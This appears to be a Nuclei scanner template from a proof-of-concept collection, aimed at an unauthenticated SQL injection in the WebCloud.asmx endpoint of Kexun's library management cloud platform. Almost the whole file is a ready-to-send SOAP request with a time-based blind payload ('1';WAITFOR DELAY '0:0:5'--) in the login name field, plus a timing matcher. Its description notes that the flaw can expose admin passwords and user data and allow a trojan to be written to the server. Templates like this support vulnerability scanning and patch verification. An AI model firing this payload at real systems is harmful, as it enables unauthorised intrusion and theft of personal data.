pocs/nuclei/kexun-WebCloud-sqli.yaml

id: kexun-WebCloud-sqli

info:
  name: kexun-WebCloud-sqli
  author: apple
  severity: high
  description: 科讯图书馆综合管理云平台WebCloud.asmx存在SQL注入，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E8%AE%AF%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0WebCloud.asmx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  tags: tags

http:
  - raw:
      - |
        POST /WebCloud.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 448
        SOAPAction: "WebCloud/LibraryCloud"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <LibraryCloud xmlns="WebCloud">
              <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:5'--","schoolpwd":"1"}</str>
              <files>base64Binary</files>
            </LibraryCloud>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"